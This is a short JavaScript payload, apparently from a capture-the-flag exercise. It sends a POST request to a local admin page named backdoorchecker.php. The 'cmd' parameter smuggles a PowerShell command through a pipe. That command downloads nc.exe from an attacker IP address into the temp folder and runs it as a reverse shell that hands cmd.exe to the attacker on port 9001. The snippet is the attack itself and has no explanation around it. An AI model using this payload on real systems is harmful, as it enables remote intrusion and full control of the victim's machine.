 var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.20/nc.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.20 9001';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
